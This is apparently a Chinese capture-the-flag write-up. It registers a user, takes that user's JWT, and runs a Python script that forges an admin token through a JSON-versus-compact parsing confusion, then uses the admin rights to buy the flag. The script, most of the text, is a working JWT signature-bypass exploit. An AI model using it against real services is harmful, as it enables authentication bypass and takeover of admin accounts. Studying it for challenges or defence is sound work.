通过注册功能注册任意一个用户，然后获取其jwt

运行下面的脚本即可获得admin的token

```python
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode
import argparse

# token="eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NDg5MzQyNTMwLCJpYXQiOjE3NDg5MzA2NTMsImp0aSI6Ik84ZnF0a1pxRjNsOHFWNmpQVmhDbXciLCJuYmYiOjE3NDg5MzA2NTMsInVzZXJuYW1lIjoiMTIzIn0.Tel89N5rIkMfszntbR5HLvJbJfLFhSUg8yATNzvAKBE77mbO_Cz1enHE8bzo34A2006rYzYhwo4SH0kHCk8BPu74Ihjcl65hxlMaXlPR97EflP2gsf2ZTjOFM9jwjyIrhUTu-speiGtOWgZ6BrgQt7KxVhfMQEC2PVMGpsozNwI2bj6clCELuCPR9MPwrwmzV-wbDNYSTsdUqtYk-RYO0sVIlJjRwh0UauEsUkgxsmOzWTsyZk3gryEOApR-0hdGO8Avnbw-BFcAP1RcqRxmVHSEclm6tBl-9asBY5SJz2ajAoz58lrptN3LbSBpo5bEBcbdQqNXgne68Zx_YE0zPw"
token=input("[+] 请输入token:")
claim="username=admin"
[header, payload, signature] = token.split(".")
parsed_payload = loads(base64url_decode(payload))

try:
    claims =claim.split(",")
    for c in claims:
        key, value = c.split("=")
        parsed_payload[key.strip()] = value.strip()
except:
    print("[-] Given claims are not in a valid format")
    exit(1)

fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
print(f'[+] 生成的admin凭证 : {new_payload}\n')
```

覆盖jwt即可拥有admin权限，然后通过金币购买flag